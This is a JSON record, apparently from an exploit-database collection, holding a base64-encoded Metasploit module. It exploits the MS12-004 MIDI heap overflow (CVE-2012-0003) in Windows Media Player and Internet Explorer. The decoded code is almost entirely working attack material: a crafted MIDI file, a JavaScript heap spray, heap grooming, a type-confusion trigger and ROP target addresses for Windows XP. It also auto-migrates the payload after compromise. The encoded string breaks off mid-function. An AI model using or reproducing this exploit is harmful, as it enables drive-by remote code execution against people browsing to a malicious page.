{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBmaWxlIGlzIHBhcnQgb2YgdGhlIE1ldGFzcGxvaXQgRnJhbWV3b3JrIGFuZCBtYXkgYmUgc3ViamVjdCB0bw0KIyByZWRpc3RyaWJ1dGlvbiBhbmQgY29tbWVyY2lhbCByZXN0cmljdGlvbnMuIFBsZWFzZSBzZWUgdGhlIE1ldGFzcGxvaXQNCiMgRnJhbWV3b3JrIHdlYiBzaXRlIGZvciBtb3JlIGluZm9ybWF0aW9uIG9uIGxpY2Vuc2luZyBhbmQgdGVybXMgb2YgdXNlLg0KIyBodHRwOi8vbWV0YXNwbG9pdC5jb20vZnJhbWV3b3JrLw0KIyMNCg0KcmVxdWlyZSAnbXNmL2NvcmUnDQoNCmNsYXNzIE1ldGFzcGxvaXQzIDwgTXNmOjpFeHBsb2l0OjpSZW1vdGUNCglSYW5rID0gTm9ybWFsUmFua2luZw0KDQoJaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6SHR0cFNlcnZlcjo6SFRNTA0KDQoJZGVmIGluaXRpYWxpemUoaW5mbz17fSkNCgkJc3VwZXIodXBkYXRlX2luZm8oaW5mbywNCgkJCSdOYW1lJyAgICAgICAgICAgPT4gIk1TMTItMDA0IG1pZGlPdXRQbGF5TmV4dFBvbHlFdmVudCBIZWFwIE92ZXJmbG93IiwNCgkJCSdEZXNjcmlwdGlvbicgICAgPT4gJXF7DQoJCQkJCVRoaXMgbW9kdWxlIGV4cGxvaXRzIGEgaGVhcCBvdmVyZmxvdyB2dWxuZXJhYmlsaXR5IGluIHRoZSBXaW5kb3dzIE11bHRpbWVkaWENCgkJCQlMaWJyYXJ5ICh3aW5tbS5kbGwpLiBUaGUgdnVsbmVyYWJpbGl0eSBvY2N1cnMgd2hlbiBwYXJzaW5nIHNwZWNpYWxseSBjcmFmdGVkDQoJCQkJTUlESSBmaWxlcy4gIFJlbW90ZSBjb2RlIGV4ZWN1dGlvbiBjYW4gYmUgYWNoaWV2ZWQgYnkgdXNpbmcgV2luZG93cyBNZWRpYSBQbGF5ZXIncw0KCQkJCUFjdGl2ZVggY29udHJvbC4NCg0KCQkJCQlFeHBsb2l0YXRpb24gaXMgZG9uZSBieSBzdXBwbHlpbmcgYSBzcGVjaWFsbHkgY3JhZnRlZCBNSURJIGZpbGUgd2l0aA0KCQkJCXNwZWNpZmljIGV2ZW50cywgY2F1c2luZyB0aGUgb2Zmc2V0IGNhbGN1bGF0aW9uIGJlaW5nIGhpZ2hlciB0aGFuIGhvdyBtdWNoIGlzDQoJCQkJYXZhaWxhYmxlIG9uIHRoZSBoZWFwICgweDQwMCBhbGxvY2F0ZWQgYnkgV0lOTU0hd2lubW1BbGxvYyksIGFuZCB0aGVuIGFsbG93aW5nDQoJCQkJdXMgdG8gZWl0aGVyICJpbmMgYWwiIG9yICJkZWMgYWwiIGEgYnl0ZS4gIFRoaXMgY2FuIGJlIHVzZWQgdG8gY29ycnVwdCBhbiBhcnJheQ0KCQkJCShDSW1wbEFyeSkgd2Ugc2V0dXAsIGFuZCBmb3JjZSB0aGUgYnJvd3NlciB0byBjb25mdXNlIHR5cGVzIGZyb20gdGFnVkFSSUFOVCBvYmplY3RzLA0KCQkJCXdoaWNoIGxldmVyYWdlcyByZW1vdGUgY29kZSBleGVjdXRpb24gdW5kZXIgdGhlIGNvbnRleHQgb2YgdGhlIHVzZXIuDQoNCgkJCQkJQXQgdGhpcyB0aW1lLCBmb3IgSUUgOCB0YXJnZXQsIEpSRSAoSmF2YSBSdW50aW1lIEVudmlyb25tZW50KSBpcyByZXF1aXJlZA0KCQkJCXRvIGJ5cGFzcyBERVAgKERhdGEgRXhlY3V0aW9uIFByZXZlbnRpb24pLg0KDQoJCQkJCU5vdGU6IEJhc2VkIG9uIG91ciB0ZXN0aW5nLCB0aGUgdnVsbmVyYWJpbGl0eSBkb2VzIG5vdCBzZWVtIHRvIHRyaWdnZXIgd2hlbg0KCQkJCXRoZSB2aWN0aW0gbWFjaGluZSBpcyBvcGVyYXRlZCB2aWEgcmRlc2t0b3AuDQoJCQl9LA0KCQkJJ0xpY2Vuc2UnICAgICAgICA9PiBNU0ZfTElDRU5TRSwNCgkJCSdBdXRob3InICAgICAgICAgPT4NCgkJCQlbDQoJCQkJCSdTaGFuZSBHYXJyZXR0JywgICNJbml0aWFsIGRpc2NvdmVyeSAoSUJNIFgtRm9yY2UpDQoJCQkJCSdqdWFuIHZhenF1ZXonLA0KCQkJCQknc2lubjNyJywNCgkJCQldLA0KCQkJJ1JlZmVyZW5jZXMnICAgICA9Pg0KCQkJCVsNCgkJCQkJWyAnTVNCJywgJ01TMTItMDA0J10sDQoJCQkJCVsgJ0NWRScsICcyMDEyLTAwMDMnIF0sDQoJCQkJCVsgJ09TVkRCJywgJzc4MjEwJ10sDQoJCQkJCVsgJ0JJRCcsICc1MTI5MiddLA0KCQkJCQlbICdVUkwnLCAnaHR0cDovL3d3dy52dXBlbi5jb20vYmxvZy8yMDEyMDExNy5BZHZhbmNlZF9FeHBsb2l0YXRpb25fb2ZfV2luZG93c19NUzEyLTAwNF9DVkUtMjAxMi0wMDAzLnBocCcgXSwNCgkJCQldLA0KCQkJJ1BheWxvYWQnICAgICAgICA9Pg0KCQkJCXsNCgkJCQkJJ1NwYWNlJyAgICA9PiAxMDI0LA0KCQkJCX0sDQoJCQknRGVmYXVsdE9wdGlvbnMnICA9Pg0KCQkJCXsNCgkJCQkJJ0VYSVRGVU5DJyAgICAgICAgICAgICA9PiAicHJvY2VzcyIsDQoJCQkJCSdJbml0aWFsQXV0b1J1blNjcmlwdCcgPT4gJ21pZ3JhdGUgLWYnLA0KCQkJCX0sDQoJCQknUGxhdGZvcm0nICAgICAgID0+ICd3aW4nLA0KCQkJJ1RhcmdldHMnICAgICAgICA9Pg0KCQkJCVsNCgkJCQkJWyAnQXV0b21hdGljJywge30gXSwNCgkJCQkJWw0KCQkJCQkJJ0lFIDYgb24gV2luZG93cyBYUCBTUDMnLA0KCQkJCQkJew0KCQkJCQkJCSdSb3AnID0+IGZhbHNlLA0KCQkJCQkJCSdEaXNwYXRjaERzdCcgPT4gMHgwYzBjMGMwYw0KCQkJCQkJfQ0KCQkJCQldLA0KCQkJCQlbDQoJCQkJCQknSUUgNyBvbiBXaW5kb3dzIFhQIFNQMycsDQoJCQkJCQl7DQoJCQkJCQkJJ1JvcCcgPT4gZmFsc2UsDQoJCQkJCQkJJ0Rpc3BhdGNoRHN0JyA9PiAweDBjMGMwYzBjDQoJCQkJCQl9DQoJCQkJCV0sDQoJCQkJCVsNCgkJCQkJCSdJRSA4IG9uIFdpbmRvd3MgWFAgU1AzJywNCgkJCQkJCXsNCgkJCQkJCQkjIHhjaGcgZWN4LGVzcA0KCQkJCQkJCSMgb3IgYnl0ZSBwdHIgW2VheF0sYWwNCgkJCQkJCQkjIGFkZCBieXRlIHB0ciBbZWRpKzVFaF0sYmwNCgkJCQkJCQkjIHJldCA4DQoJCQkJCQkJIyBGcm9tIElNQUdFSExQDQoJCQkJCQkJJ1JvcCcgPT4gdHJ1ZSwNCgkJCQkJCQknU3RhY2tQaXZvdCcgPT4gMHg3NkM5QjRDMiwNCgkJCQkJCQknRGlzcGF0Y2hEc3QnID0+IDB4MGMwYzFiZTQNCgkJCQkJCX0NCgkJCQkJXSwNCgkJCQldLA0KCQkJJ1ByaXZpbGVnZWQnICAgICA9PiBmYWxzZSwNCgkJCSdEaXNjbG9zdXJlRGF0ZScgPT4gIkphbiAxMCAyMDEyIiwNCgkJCSdEZWZhdWx0VGFyZ2V0JyAgPT4gMCkpDQoNCgkJcmVnaXN0ZXJfb3B0aW9ucygNCgkJCVsNCgkJCQlPcHRCb29sLm5ldygnT0JGVVNDQVRFJywgW2ZhbHNlLCAnRW5hYmxlIEphdmFTY3JpcHQgb2JmdXNjYXRpb24nLCBmYWxzZV0pDQoJCQldLCBzZWxmLmNsYXNzKQ0KDQoJZW5kDQoNCglkZWYgZ2V0X3RhcmdldChyZXF1ZXN0KQ0KCQlhZ2VudCA9IHJlcXVlc3QuaGVhZGVyc1snVXNlci1BZ2VudCddDQoJCXZwcmludF9zdGF0dXMoIlJlcXVlc3QgZnJvbTogI3thZ2VudH0iKQ0KDQoJCWlmIGFnZW50ID1+IC9OVCA1XC4xLyBhbmQgYWdlbnQgPX4gL01TSUUgNlwuMC8NCgkJCSNXaW5kb3dzIFhQIFNQMyArIElFIDYuMA0KCQkJcmV0dXJuIHRhcmdldHNbMV0NCgkJZWxzaWYgYWdlbnQgPX4gL05UIDVcLjEvIGFuZCBhZ2VudCA9fiAvTVNJRSA3XC4wLw0KCQkJI1dpbmRvd3MgWFAgU1AzICsgSUUgNy4wDQoJCQlyZXR1cm4gdGFyZ2V0c1syXQ0KCQllbHNpZiBhZ2VudCA9fiAvTlQgNVwuMS8gYW5kIGFnZW50ID1+IC9NU0lFIDhcLjAvDQoJCQkjV2luZG93cyBYUCBTUDMgKyBJRSA4LjAgKyBKUkU2DQoJCQlyZXR1cm4gdGFyZ2V0c1szXQ0KCQllbHNlDQoJCQlyZXR1cm4gbmlsDQoJCWVuZA0KCWVuZA0KDQoJZGVmIGdldF9taWRpDQoJCSMgTUlESSBGaWxlZm9ybWF0IFJlZmVyZW5jZToNCgkJIyBodHRwOi8vd3d3LnNvbmljc3BvdC5jb20vZ3VpZGUvbWlkaWZpbGVzLmh0bWwNCgkJIw0KCQkjIEV2ZW50IFR5cGVzOg0KCQkjIDB4MDggPSBOb3RlIE9mZiAod2hlbiBNSURJIGtleSBpcyByZWxlYXNlZCkNCgkJIyAweDA5ID0gTm90ZSBPbiAod2hlbiBNSURJIGtleSBpcyBwcmVzc2VkKQ0KCQkjIDB4MEEgPSBOb3RlIGFmdGVydG91Y2ggKHByZXNzdXJlIGNoYW5nZSBvbiB0aGUgcHJlc3NlZCBNSURJIGtleSkNCgkJIyAweDBCID0gQ29udHJvbGxlciBFdmVudCAoTUlESSBjaGFubmVscyBzdGF0ZSkNCgkJIyAweDBDID0gUHJvZ3JhbSBjaGFuZ2UgKFdoaWNoIGluc3RydW1lbnQvcGF0Y2ggc2hvdWxkIGJlIHBsYXllZCBvbiB0aGUgTUlESSBjaGFubmVsKQ0KCQkjIDB4MEQgPSBDaGFubmVsIGFmdGVydG91Y2ggKHNpbWlsYXIgdG8gTm90ZSBBZnRlcnRvdWNoOyBlZmZlY3RzIGFsbCBrZXlzIHByZXNzZWQgb24gdGhlIHNwZWNpZmljIE1JREkgY2hhbm5lbCkNCgkJIyAweDBFID0gUGl0Y2ggQmVuZCAoc2ltaWxpYXIgdG8gYSBjb250cm9sbGVyIGV2ZW50OyBoYXMgMiBieXRlcyB0byBkZXNjcmliZSBpdHMgdmFsdWUpDQoJCSMgMHgwRiA9IE1ldGEgRXZlbnRzIChub3Qgc2VudCBvciByZWNlaXZlZCBvdmVyIGEgbWlkaSBwb3J0KQ0KDQoJCSMgU3RydWN0dXJlOg0KCQkjIFtIZWFkZXIgQ2h1bmtdW1RyYWNrIENodW5rXVtNZXRhIEV2ZW50XVtNZXRhIEV2ZW50XVtTWVNFWCBFdmVudF1bTWlkaSBDaGFubmVsIEV2ZW50KQ0KCQkjIFByb2JsZW06DQoJCSMgV2luZG93cyBNZWRpYSBQbGF5ZXIgZmFpbHMgdG8gbWFuYWdlIE5vdGUgT24gYW5kIE5vdGUgT2ZmIEV2ZW50cw0KDQoJCSMgVHJhY2sgQ2h1bmsgRGF0YQ0KCQl0YyA9ICJceDAwXHhGRlx4MDNceDBEXHg0NFx4NzJceDc1XHg2RCINCgkJIyBNZXRhIEV2ZW50IC0gU2VxdWVuY2UvVHJhY2sgTmFtZQ0KCQl0YyA8PCAiXHg3M1x4MjBceDIwXHgyMFx4MjhceDQyXHg0Mlx4MjlceDAwIg0KCQkjIE1pZGkgQ2hhbm5lbCBFdmVudCAtIFByb2dyYW0gQ2hhbmdlDQoJCXRjIDw8ICJceDAwXHhDOVx4MjgiDQoJCSMgTWlkaSBDaGFubmVsIEV2ZW50IC0gQ29udHJvbGxlcg0KCQl0YyA8PCAiXHgwMFx4QjlceDA3XHg2NCINCgkJIyBNaWRpIENoYW5uZWwgRXZlbnQgLSBDb250cm9sbGVyDQoJCXRjIDw8ICJceDAwXHhCOVx4MEFceDQwIg0KCQkjIE1pZGkgQ2hhbm5lbCBFdmVudCAtIENvbnRyb2xsZXINCgkJdGMgPDwgIlx4MDBceEI5XHg3Qlx4MDAiDQoJCSMgTWlkaSBDaGFubmVsIEV2ZW50IC0gQ29udHJvbGxlcg0KCQl0YyA8PCAiXHgwMFx4QjlceDVCXHgyOCINCgkJIyBNaWRpIENoYW5uZWwgRXZlbnQgLSBDb250cm9sbGVyDQoJCXRjIDw8ICJceDAwXHhCOVx4NURceDAwIg0KCQkjIE1pZGkgQ2hhbm5lbCBFdmVudCAtIE5vdGUgT24NCgkJdGMgPDwgIlx4ODVceDUwXHg5OVx4MjNceDdGIg0KDQoJCSMgQ29ycnVwdGlvbiBldmVudHMNCgkJIyBNaWRpIENoYW5uZWwgRXZlbnQgLSBOb3RlIE9uDQoJCXRjIDw8ICJceDAwXHg5Rlx4YjJceDczIg0KCQkjIEVuZHMgQ29ycnVwdGlvbiBldmVudHMNCg0KCQkjIE1ldGEgRXZlbnQgLSBFbmQgT2YgVHJhY2sNCgkJdGMgPDwgIlx4MDBceEZGXHgyRlx4MDAiDQoJCW0gPSAnJw0KCQkjIEhFQURFUkNIVU5LIEhlYWRlcg0KCQltIDw8ICJNVGhkIiAgICAgICAgICAgICAgICAgIyBIZWFkZXINCgkJbSA8PCAiXHgwMFx4MDBceDAwXHgwNiIgICAgICMgQ2h1bmsgc2l6ZQ0KCQltIDw8ICJceDAwXHgwMCIgICAgICAgICAgICAgIyBGb3JtYXQgVHlwZQ0KCQltIDw8ICJceDAwXHgwMSIgICAgICAgICAgICAgIyBOdW1iZXIgb2YgdHJhY2tzDQoJCW0gPDwgIlx4MDBceDYwIiAgICAgICAgICAgICAjIFRpbWUgZGl2aXNpb24NCgkJIyBUUkFDS0NIVU5LIGhlYWRlcg0KCQltIDw8ICJNVHJrIiAgICAgICAgICAgICAgICAgIyBIZWFkZXINCgkJbSA8PCBbdGMubGVuZ3RoXS5wYWNrKCdOJykNCgkJbSA8PCB0Yw0KDQoJCW1pZGlfbmFtZSA9ICJ0ZXN0X2Nhc2UubWlkIg0KDQoJCXJldHVybiBtaWRpX25hbWUsIG0NCgllbmQNCg0KCWRlZiBvbl9yZXF1ZXN0X3VyaShjbGksIHJlcXVlc3QpDQoNCgkJaWYgcmVxdWVzdC51cmkgPX4gL1wubWlkJC9pDQoJCQlwcmludF9zdGF0dXMoIlNlbmRpbmcgbWlkaSBmaWxlIHRvICN7Y2xpLnBlZXJob3N0fToje2NsaS5wZWVycG9ydH0uLi4iKQ0KCQkJc2VuZF9yZXNwb25zZShjbGksIEBtaWRpLCB7J0NvbnRlbnQtVHlwZSc9PidhcHBsaWNhdGlvbi9vY3RldC1zdHJlbSd9KQ0KCQkJcmV0dXJuDQoJCWVuZA0KDQoJCSNTZXQgZGVmYXVsdCB0YXJnZXQNCgkJbXlfdGFyZ2V0ID0gdGFyZ2V0DQoNCgkJI0lmIHVzZXIgY2hvb3NlcyBhdXRvbWF0aWMgdGFyZ2V0LCB3ZSBjaG9vc2Ugb25lIGJhc2VkIG9uIHVzZXIgYWdlbnQNCgkJaWYgbXlfdGFyZ2V0Lm5hbWUgPX4gL0F1dG9tYXRpYy8NCgkJCW15X3RhcmdldCA9IGdldF90YXJnZXQocmVxdWVzdCkNCgkJCWlmIG15X3RhcmdldC5uaWw/DQoJCQkJc2VuZF9ub3RfZm91bmQoY2xpKQ0KCQkJCXByaW50X2Vycm9yKCIje2NsaS5wZWVyaG9zdH06I3tjbGkucGVlcnBvcnR9IFVua25vd24gdXNlci1hZ2VudCIpDQoJCQkJcmV0dXJuDQoJCQllbmQNCgkJCXZwcmludF9zdGF0dXMoIlRhcmdldCBzZWxlY3RlZDogI3tteV90YXJnZXQubmFtZX0iKQ0KCQllbmQNCg0KCQltaWRpX3VyaSA9ICgnLycgPT0gZ2V0X3Jlc291cmNlWy0xLDFdKSA/IGdldF9yZXNvdXJjZVswLCBnZXRfcmVzb3VyY2UubGVuZ3RoLTFdIDogZ2V0X3Jlc291cmNlDQoJCW1pZGlfdXJpIDw8ICIvI3tAbV9uYW1lfSINCg0KCQlzcHJheSA9IGJ1aWxkX3NwcmF5KG15X3RhcmdldCkNCg0KCQlpZiBkYXRhc3RvcmVbJ09CRlVTQ0FURSddDQoJCQlzcHJheSA9IDo6UmV4OjpFeHBsb2l0YXRpb246OkpTT2JmdS5uZXcoc3ByYXkpDQoJCQlzcHJheS5vYmZ1c2NhdGUNCgkJZW5kDQoNCgkJdHJpZ2dlciA9IGJ1aWxkX3RyaWdnZXIobXlfdGFyZ2V0KQ0KCQl0cmlnZ2VyX2ZuID0gInRyaWdnZXIiDQoNCgkJaWYgZGF0YXN0b3JlWydPQkZVU0NBVEUnXQ0KCQkJdHJpZ2dlciA9IDo6UmV4OjpFeHBsb2l0YXRpb246OkpTT2JmdS5uZXcodHJpZ2dlcikNCgkJCXRyaWdnZXIub2JmdXNjYXRlDQoJCQl0cmlnZ2VyX2ZuID0gZmluZF90cmlnZ2VyX2ZuKHRyaWdnZXIudG9fcykNCgkJZW5kDQoNCgkJaHRtbCA9ICVRfA0KCQk8aHRtbD4NCgkJPGhlYWQ+DQoJCTxzY3JpcHQgbGFuZ3VhZ2U9J2phdmFzY3JpcHQnPg0KCQkJI3tzcHJheX0NCgkJPC9zY3JpcHQ+DQoJCTxzY3JpcHQgbGFuZ3VhZ2U9J2phdmFzY3JpcHQnPg0KCQkJI3t0cmlnZ2VyfQ0KCQk8L3NjcmlwdD4NCgkJPHNjcmlwdCBmb3I9YXVkaW8gZXZlbnQ9UGxheVN0YXRlQ2hhbmdlKG9sZFN0YXRlLG5ld1N0YXRlKT4NCgkJCWlmIChvbGRTdGF0ZSA9PSAzICYmIG5ld1N0YXRlID09IDApIHsNCgkJCQkje3RyaWdnZXJfZm59KCk7DQoJCQl9DQoJCTwvc2NyaXB0Pg0KCQk8L2hlYWQ+DQoJCTxib2R5Pg0KCQkJPG9iamVjdCBJRD0iYXVkaW8iIFdJRFRIPTEgSEVJR0hUPTEgQ0xBU1NJRD0iQ0xTSUQ6MjJENkYzMTItQjBGNi0xMUQwLTk0QUItMDA4MEM3NEM3RTk1Ij4NCgkJCQk8cGFyYW0gbmFtZT0iZmlsZU5hbWUiIHZhbHVlPSIje21pZGlfdXJpfSI+DQoJCQkJPHBhcmFtIG5hbWU9IlNlbmRQbGF5U3RhdGVDaGFuZ2VFdmVudHMiIHZhbHVlPSJ0cnVlIj4NCgkJCQk8cGFyYW0gTkFNRT0iQXV0b1N0YXJ0IiB2YWx1ZT0iVHJ1ZSI+DQoJCQkJPHBhcmFtIG5hbWU9InVpTW9kZSIgdmFsdWU9Im1pbmkiPg0KCQkJCTxwYXJhbSBuYW1lPSJWb2x1bWUiIHZhbHVlPSItMzAwIj4NCgkJCTwvb2JqZWN0Pg0KCQk8L2JvZHk+DQoJCTwvaHRtbD4NCgkJfA0KDQoJCWh0bWwgPSBodG1sLmdzdWIoL15cdFx0LywgJycpDQoNCgkJcHJpbnRfc3RhdHVzKCJTZW5kaW5nIGh0bWwgdG8gI3tjbGkucGVlcmhvc3R9OiN7Y2xpLnBlZXJwb3J0fS4uLiIpDQoJCXNlbmRfcmVzcG9uc2UoY2xpLCBodG1sLCB7J0NvbnRlbnQtVHlwZSc9Pid0ZXh0L2h0bWwnfSkNCgllbmQNCg0KCWRlZiBleHBsb2l0DQoJCUBtX25hbWUsIEBtaWRpID0gZ2V0X21pZGkNCgkJc3VwZXINCgllbmQNCg0KCWRlZiBidWlsZF9zcHJheShteV90YXJnZXQpDQoNCgkJIyBFeHRyYWN0IHN0cmluZyBiYXNlZCBvbiB0YXJnZXQNCgkJaWYgbXlfdGFyZ2V0Lm5hbWUgPT0gJ0lFIDggb24gV2luZG93cyBYUCBTUDMnDQoJCQlqc19leHRyYWN0X3N0ciA9ICJ2YXIgYmxvY2sgPSBzaGVsbGNvZGUuc3Vic3RyaW5nKDIsICgweDQwMDAwLTB4MjEpLzIpOyINCgkJZWxzZQ0KCQkJanNfZXh0cmFjdF9zdHIgPSAidmFyIGJsb2NrID0gc2hlbGxjb2RlLnN1YnN0cmluZygwLCAoMHg4MDAwMC02KS8yKTsiDQoJCWVuZA0KDQoJCSMgQnVpbGQgc2hlbGxjb2RlIGJhc2VkIG9uIFJvcCByZXF1aXJlbWVudA0KCQlpZiBteV90YXJnZXRbJ1JvcCddDQoJCQljb2RlID0gY3JlYXRlX3JvcF9jaGFpbihteV90YXJnZXQpDQoJCQljb2RlIDw8IHBheWxvYWQuZW5jb2RlZA0KCQkJc2hlbGxjb2RlID0gUmV4OjpUZXh0LnRvX3VuZXNjYXBlKGNvZGUpDQoJCWVsc2UNCgkJCWNvZGUgPSBwYXlsb2FkLmVuY29kZWQNCgkJCXNoZWxsY29kZSA9IFJleDo6VGV4dC50b191bmVzY2FwZShjb2RlKQ0KCQllbmQNCg0KCQkjIDEuIENyZWF0ZSAgYmlnIGJsb2NrIG9mIG5vcHMNCgkJIyAyLiBDb21wb3NlIG9uZSBibG9jayB3aGljaCBpcyBub3BzICsgc2hlbGxjb2RlDQoJCSMgMy4gUmVwZWF0IHRoZSBibG9jaw0KCQkjIDQuIEV4dHJhY3Qgc3RyaW5nIGZyb20gdGhlIGJpZyBibG9jaw0KCQkjIDUuIFNwcmF5DQoJCXNwcmF5ID0gPDwtSlMNCgkJdmFyIGhlYXBfb2JqID0gbmV3IGhlYXBMaWIuaWUoMHgxMDAwMCk7DQoNCgkJdmFyIGNvZGUgPSB1bmVzY2FwZSgiI3tzaGVsbGNvZGV9Iik7DQoJCXZhciBub3BzID0gdW5lc2NhcGUoIiV1MGMwYyV1MGMwYyIpOw0KDQoJCXdoaWxlIChub3BzLmxlbmd0aCA8IDB4MTAwMCkgbm9wcys9IG5vcHM7DQoNCgkJdmFyIHNoZWxsY29kZSA9ICBub3BzLnN1YnN0cmluZygwLDB4ODAwIC0gY29kZS5sZW5ndGgpICsgY29kZTsNCg0KCQl3aGlsZSAoc2hlbGxjb2RlLmxlbmd0aCA8IDB4NDAwMDApIHNoZWxsY29kZSArPSBzaGVsbGNvZGU7DQoNCgkJI3tqc19leHRyYWN0X3N0cn0NCg0KCQloZWFwX29iai5nYygpOw0KCQlmb3IgKHZhciBpPTA7IGkgPCA2MDA7IGkrKykgew0KCQkJaGVhcF9vYmouYWxsb2MoYmxvY2spOw0KCQl9DQoNCgkJSlMNCg0KCQlzcHJheSA9IGhlYXBsaWIoc3ByYXksIHs6bm9vYmZ1ID0+IHRydWV9KQ0KCQlyZXR1cm4gc3ByYXkNCgllbmQNCg0KCSMgQnVpbGQgdGhlIEphdmFTY3JpcHQgc3RyaW5nIGZvciB0aGUgYXR0cmlidXRlcw0KCWRlZiBidWlsZF9lbGVtZW50KGVsZW1lbnRfbmFtZSwgbXlfdGFyZ2V0KQ0KCQlkc3QgPSBSZXg6OlRleHQudG9fdW5lc2NhcGUoW215X3RhcmdldFsnRGlzcGF0Y2hEc3QnXV0ucGFjaygiViIpKQ0KCQllbGVtZW50ID0gJycNCg0KCQlpZiBteV90YXJnZXQubmFtZSA9fiAvSUUgOC8NCgkJCW1heCAgID0gNjMgICAjIE51bWJlciBvZiBhdHRyaWJ1dGVzIGZvciBJRSA4DQoJCQlpbmRleCA9IDEgICAgIyBXaGVyZSB3ZSB3YW50IHRvIGNvbmZ1c2UgdGhlIHR5cGUNCgkJZWxzZQ0KCQkJbWF4ICAgPSA1NSAgICMgTnVtYmVyIG9mIGF0dHJpYnV0ZXMgZm9yIGJlZm9yZSBJRSA4DQoJCQlpbmRleCA9IDAgICAgIyBXaGVyZSB3ZSB3YW50IHRvIGNvbmZ1c2UgdGhlIHR5cGUNCgkJZW5kDQoNCgkJZWxlbWVudCA8PCAidmFyICN7ZWxlbWVudF9uYW1lfSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoXCJzZWxlY3RcIikiICsgIlxuIg0KDQoJCSMgQnVpbGQgYXR0cmlidXRlcw0KCQkwLnVwdG8obWF4KSBkbyB8aXwNCgkJCW9iaiA9IChpPT1pbmRleCkgPyAidW5lc2NhcGUoXCIje2RzdH1cIikiIDogImFsZXJ0Ig0KCQkJZWxlbWVudCA8PCAiI3tlbGVtZW50X25hbWV9Lncje2kudG9fc30gPSAje29ian0iICsgIlxuIg0KCQllbmQNCg0KCQlyZXR1cm4gZWxlbWVudA0KCWVuZA0KDQoJIyBGZW5nIFNodWkgYW5kIHRyaWdnZXJpbmcgU3RlcHM6DQoJIyAxLiBSdW4gdGhlIGdhcmJhZ2UgY29sbGVjdG9yIGJlZm9yZSBhbGxvY2F0aW9ucw0KCSMgMi4gRGVmcmFnbWVudCB0aGUgaGVhcCBhbmQgYWxsb2MgQ0ltcGxBcnkgb2JqZWN0cyBpbiBvbmUgc3RlcCAob2JqZWN0cyBzaXplIGFyZSBJRSB2ZXJzaW9uIGRlcGVuZGVudCkNCgkjIDMuIE1ha2UgaG9sZXMNCgkjIDQuIExldCB3aW5kb3dzIG1lZGlhIHBsYXkgdGhlIGNyYWZ0ZWQgbWlkaSBmaWxlIGFuZCBjb3JydXB0IHRoZSBoZWFwDQoJIyA1LiBGb3JjZSB0aGUgdXNpbmcgb2YgdGhlIGNvbmZ1c2VkIHRhZ1ZBUklBTlQuDQoJZGVmIGJ1aWxkX3RyaWdnZXIobXlfdGFyZ2V0KQ0KDQoJCWlmIG15X3RhcmdldC5uYW1lID09ICdJRSA4IG9uIFdpbmRvd3MgWFAgU1AzJw0KDQoJCQkjIFJlZG9pbmcgdGhlIGZlbmcgc2h1aSBpZiBmYWlscyBtYWtlcyBpdCByZWxpYWJsZQ0KCQkJanNfdHJpZ2dlciA9IDw8LUpTVFJJR0dFUg0KCQkJZnVuY3Rpb24gdHJpZ2dlcigpew0KCQkJCXZhciBrID0gOTk5Ow0KCQkJCXdoaWxlIChrID4gMCkgew0KCQkJCQlpZiAodHlwZW9mKGNsb25lc1trXS53MSkgPT0gInN0cmluZyIpIHsNCgkJCQkJfSBlbHNlIHsNCgkJCQkJCWNsb25lc1trXS53MSgnY29tZSBvbiEnKTsNCgkJCQkJfQ0KCQkJCQlrID0gayAtIDI7DQoJCQkJfQ0KCQkJCWZlbmdfc2h1aSgpOw0KCQkJCWRvY3VtZW50LmF1ZGlvLlBsYXkoKTsNCgkJCX0NCgkJCUpTVFJJR0dFUg0KDQoJCQlzZWxlY3RfZWxlbWVudCA9IGJ1aWxkX2VsZW1lbnQoJ3NlbG9iJywgbXlfdGFyZ2V0KQ0KCQllbHNlDQoNCgkJCWpzX3RyaWdnZXIgPSA8PC1KU1RSSUdHRVINCgkJCWZ1bmN0aW9uIHRyaWdnZXIoKXsNCgkJCQl2YXIgayA9IDk5OTsNCgkJCQl3aGlsZSAoayA+IDApIHsNCgkJCQkJaWYgKHR5cGVvZihjbG9uZXNba10udzApID09ICJzdHJpbmciKSB7DQoJCQkJCX0gZWxzZSB7DQoJCQkJCQljbG9uZXNba10udzAoJ2NvbWUgb24hJyk7DQoJCQkJCX0NCgkJCQkJayA9IGsgLSAyOw0KCQkJCX0NCgkJCQlmZW5nX3NodWkoKTsNCgkJCQlkb2N1bWVudC5hdWRpby5QbGF5KCk7DQoJCQl9DQoJCQlKU1RSSUdHRVINCg0KCQkJc2VsZWN0X2VsZW1lbnQgPSBidWlsZF9lbGVtZW50KCdzZWxvYicsIG15X3RhcmdldCkNCgkJZW5kDQoNCgkJdHJpZ2dlciA9IDw8LUpTDQoJCQl2YXIgaGVhcCA9IG5ldyBoZWFwTGliLmllKCk7DQoJCQkje3NlbGVjdF9lbGVtZW50fQ0KCQkJdmFyIGNsb25lcz1uZXcgQXJyYXkoMTAwMCk7DQoNCgkJCWZ1bmN0aW9uIGZlbmdfc2h1aSgpIHsNCg0KCQkJCWhlYXAuZ2MoKTsNCg0KCQkJCXZhciBpID0gMDsNCgkJCQl3aGlsZSAoaSA8IDEwMDApIHsNCgkJCQkJY2xvbmVzW2ldID0gc2Vsb2IuY2xvbmVOb2RlKHRydWUpDQoJCQkJCWkgPSBpICsgMTsNCgkJCQl9DQoNCgkJCQl2YXIgaiA9IDA7DQoJCQkJd2hpbGUgKGogPCAxMDAwKSB7DQoJCQkJCWRlbGV0ZSBjbG9uZXNbal07DQoJCQkJCUNvbGxlY3RHYXJiYWdlKCk7DQoJCQkJCWogID0gaiArIDI7DQoJCQkJfQ0KDQoJCQl9DQoNCgkJCWZlbmdfc2h1aSgpOw0KDQoJCQkje2pzX3RyaWdnZXJ9DQoJCUpTDQoNCgkJdHJpZ2dlciA9IGhlYXBsaWIodHJpZ2dlciwgezpub29iZnUgPT4gdHJ1ZX0pDQoJCXJldHVybiB0cmlnZ2VyDQoJZW5kDQoNCglkZWYgZmluZF90cmlnZ2VyX2ZuKHRyaWdnZXIpDQoJCWZucyA9IHRyaWdnZXIuc2NhbigvZnVuY3Rpb24gKFthLXpBLVowLTlfXSspXChcKS8pDQoJCWlmIGZucy5uaWw/IG9yIGZucy5lbXB0eT8NCgkJCXJldHVybiAidHJpZ2dlciINCgkJZWxzZQ0KCQkJcmV0dXJuIGZucy5sYXN0LmZpcnN0DQoJCWVuZA0KCQlyZXR1cm4gInRyaWdnZXIiDQoJZW5kDQoNCglkZWYganVuayhuPTEpDQoJCXRtcCA9IFtdDQoJCXZhbHVlID0gcmFuZF90Z